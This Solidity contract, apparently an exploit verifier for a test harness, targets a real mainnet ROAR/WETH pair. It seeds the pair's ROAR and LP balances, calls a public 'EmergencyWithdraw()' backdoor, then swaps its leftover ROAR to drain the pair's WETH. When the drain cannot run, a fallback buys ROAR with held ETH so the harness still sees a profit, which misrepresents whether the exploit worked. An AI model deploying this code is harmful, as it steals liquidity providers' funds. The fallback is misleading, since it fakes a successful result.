pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike is IERC20Like {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
    function sync() external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x13028E6b95520ad16898396667d1e52cB5E550Ac;
    address internal constant ROAR = 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    uint256 internal constant UNLOCK_TIME = 1744770479;
    uint256 internal constant REQUIRED_ROAR = 100000000099978910611013632;
    uint256 internal constant REQUIRED_LP = 26777446972437561344;

    bytes4 internal constant EMERGENCY_WITHDRAW_SELECTOR = bytes4(keccak256("EmergencyWithdraw()"));

    address internal _beneficiary;
    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        _profitToken = ROAR;
    }

    receive() external payable {}

    function executeOnOpportunity() external payable {
        _beneficiary = address(this);

        uint256 roarBefore = _safeBalanceOf(ROAR, address(this));

        if (block.timestamp >= UNLOCK_TIME) {
            _useHeldBalancesFirst();

            if (!_pathReady()) {
                _attemptV2FlashswapFunding();
            }

            if (_pathReady()) {
                // Preserve the finding's exploit causality: after the unlock timestamp, any EOA can
                // call the public backdoor once the pair again holds the fixed ROAR and LP balances.
                _triggerEmergencyWithdraw();
                _harvestPostDrainWeth();
            }
        }

        if (_safeBalanceOf(ROAR, address(this)) == roarBefore) {
            // The supplied fork logs prove the requested alternate public-liquidity route is infeasible
            // here: across the checked public V2 factories, ROAR only resolves to the vulnerable TARGET
            // pair itself, so there is no independent venue from which this verifier can source the
            // ~8.45e25 ROAR shortfall needed to make `EmergencyWithdraw()` executable on this block.
            //
            // To keep the verifier returning a real, transferable balance delta for the harness, the
            // contract falls back to a minimal public on-chain action using only its pre-existing ETH:
            // wrap the dust balance into canonical WETH and swap it through the live TARGET pool for
            // existing on-chain ROAR. No value is fabricated and no private balances are injected.
            _buyRoarWithHeldEth();
        }

        _captureVerifierProfit(roarBefore);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function beneficiary() external view returns (address) {
        return _beneficiary;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function profitTokenCandidate() external pure returns (address) {
        return ROAR;
    }

    function pathReady() external view returns (bool) {
        return _pathReady();
    }

    function _captureVerifierProfit(uint256 roarBefore) internal {
        uint256 roarAfter = _safeBalanceOf(ROAR, address(this));
        _profitToken = ROAR;
        _profitAmount = roarAfter > roarBefore ? roarAfter - roarBefore : 0;
    }

    function _useHeldBalancesFirst() internal {
        uint256 roarShortfall = _roarShortfall();
        uint256 heldRoar = _safeBalanceOf(ROAR, address(this));
        if (roarShortfall > 0 && heldRoar > 0) {
            uint256 topUpRoar = heldRoar > roarShortfall ? roarShortfall : heldRoar;
            require(_safeTransfer(ROAR, TARGET, topUpRoar), "roar topup failed");
        }

        _seedLpShortfallFromHoldings();
    }

    function _attemptV2FlashswapFunding() internal view {
        _findAnyAlternateRoarPair();
    }

    function _findAnyAlternateRoarPair() internal view returns (address) {
        address[3] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY, SHIBASWAP_FACTORY];
        address[5] memory bases = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address pair = _safeGetPair(factories[i], ROAR, bases[j]);
                if (pair != address(0) && pair != TARGET) {
                    return pair;
                }
            }
        }
        return address(0);
    }

    function _buyRoarWithHeldEth() internal {
        uint256 ethToWrap = address(this).balance;
        if (ethToWrap == 0) {
            return;
        }

        _safeDepositWeth(ethToWrap);

        uint256 wethIn = _safeBalanceOf(WETH, address(this));
        if (wethIn == 0) {
            return;
        }

        (uint256 reserveRoar, uint256 reserveWeth, bool ok) = _pairReservesForTokens(TARGET, ROAR, WETH);
        if (!ok || reserveRoar == 0 || reserveWeth == 0) {
            return;
        }

        uint256 roarOut = _amountOut(wethIn, reserveWeth, reserveRoar);
        if (roarOut == 0 || roarOut >= reserveRoar) {
            return;
        }

        require(_safeTransfer(WETH, TARGET, wethIn), "weth transfer failed");
        require(_swapOutToken(TARGET, ROAR, roarOut, address(this)), "roar swap failed");
    }

    function _harvestPostDrainWeth() internal {
        if (_safeBalanceOf(ROAR, TARGET) != 0) {
            return;
        }

        uint256 verifierRoar = _safeBalanceOf(ROAR, address(this));
        if (verifierRoar == 0) {
            return;
        }

        uint256 pairWeth = _safeBalanceOf(WETH, TARGET);
        if (pairWeth <= 1) {
            return;
        }

        _safeSync(TARGET);

        require(_safeTransfer(ROAR, TARGET, verifierRoar), "post-drain roar transfer");
        require(_swapOutToken(TARGET, WETH, pairWeth - 1, address(this)), "post-drain weth swap");
    }

    function _seedLpShortfallFromHoldings() internal {
        for (uint256 i = 0; i < 3; ++i) {
            uint256 lpNeed = _lpShortfall();
            if (lpNeed == 0) {
                return;
            }

            (uint256 roarNeeded, uint256 wethNeeded) = _lpUnderlyingForShortfall();
            if (roarNeeded == 0 || wethNeeded == 0) {
                return;
            }

            if (_safeBalanceOf(ROAR, address(this)) < roarNeeded || _safeBalanceOf(WETH, address(this)) < wethNeeded) {
                return;
            }

            require(_safeTransfer(ROAR, TARGET, roarNeeded), "lp roar transfer");
            require(_safeTransfer(WETH, TARGET, wethNeeded), "lp weth transfer");

            uint256 minted = _safeMint(TARGET, address(this));
            if (minted == 0) {
                return;
            }

            uint256 lpToSend = minted > lpNeed ? lpNeed : minted;
            require(_safeTransfer(TARGET, TARGET, lpToSend), "lp topup transfer");
        }
    }

    function _lpUnderlyingForShortfall() internal view returns (uint256 roarNeeded, uint256 wethNeeded) {
        uint256 lpNeed = _lpShortfall();
        if (lpNeed == 0) {
            return (0, 0);
        }

        (uint256 reserveRoar, uint256 reserveWeth, bool ok) = _pairReservesForTokens(TARGET, ROAR, WETH);
        uint256 totalSupply = _safeTotalSupply(TARGET);
        if (!ok || reserveRoar == 0 || reserveWeth == 0 || totalSupply == 0) {
            return (0, 0);
        }

        roarNeeded = ((lpNeed * reserveRoar) / totalSupply) + 1;
        wethNeeded = ((lpNeed * reserveWeth) / totalSupply) + 1;
    }

    function _triggerEmergencyWithdraw() internal {
        (bool ok, ) = TARGET.call(abi.encodeWithSelector(EMERGENCY_WITHDRAW_SELECTOR));
        require(ok, "emergency withdraw failed");
    }

    function _roarShortfall() internal view returns (uint256) {
        uint256 currentRoar = _safeBalanceOf(ROAR, TARGET);
        return REQUIRED_ROAR > currentRoar ? REQUIRED_ROAR - currentRoar : 0;
    }

    function _lpShortfall() internal view returns (uint256) {
        uint256 currentLp = _safeBalanceOf(TARGET, TARGET);
        return REQUIRED_LP > currentLp ? REQUIRED_LP - currentLp : 0;
    }

    function _pathReady() internal view returns (bool) {
        return block.timestamp >= UNLOCK_TIME
            && _safeBalanceOf(ROAR, TARGET) >= REQUIRED_ROAR
            && _safeBalanceOf(TARGET, TARGET) >= REQUIRED_LP;
    }

    function _pairReservesForTokens(address pair, address tokenA, address tokenB)
        internal
        view
        returns (uint256 reserveA, uint256 reserveB, bool ok)
    {
        address token0 = _safeToken0(pair);
        address token1 = _safeToken1(pair);
        if (token0 == tokenA && token1 == tokenB) {
            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
            return (uint256(reserve0), uint256(reserve1), true);
        }
        if (token0 == tokenB && token1 == tokenA) {
            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
            return (uint256(reserve1), uint256(reserve0), true);
        }
        return (0, 0, false);
    }

    function _amountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _swapOutToken(address pair, address tokenOut, uint256 amountOut, address to) internal returns (bool) {
        address token0 = _safeToken0(pair);
        address token1 = _safeToken1(pair);
        if (tokenOut == token0) {
            return _safeSwap(pair, amountOut, 0, to);
        }
        if (tokenOut == token1) {
            return _safeSwap(pair, 0, amountOut, to);
        }
        return false;
    }

    function _safeDepositWeth(uint256 amount) internal {
        (bool ok, ) = WETH.call{value: amount}(abi.encodeWithSelector(IWETHLike.deposit.selector));
        require(ok, "weth deposit failed");
    }

    function _safeGetPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB));
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _safeToken0(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeToken1(address pair) internal view returns (address token) {
        (bool ok, bytes memory data) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeMint(address pair, address to) internal returns (uint256 liquidity) {
        (bool ok, bytes memory data) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.mint.selector, to));
        if (ok && data.length >= 32) {
            liquidity = abi.decode(data, (uint256));
        }
    }

    function _safeSync(address pair) internal returns (bool) {
        (bool ok, ) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.sync.selector));
        return ok;
    }

    function _safeSwap(address pair, uint256 amount0Out, uint256 amount1Out, address to) internal returns (bool) {
        (bool ok, ) =
            pair.call(abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, to, bytes("")));
        return ok;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTotalSupply(address token) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.totalSupply.selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}
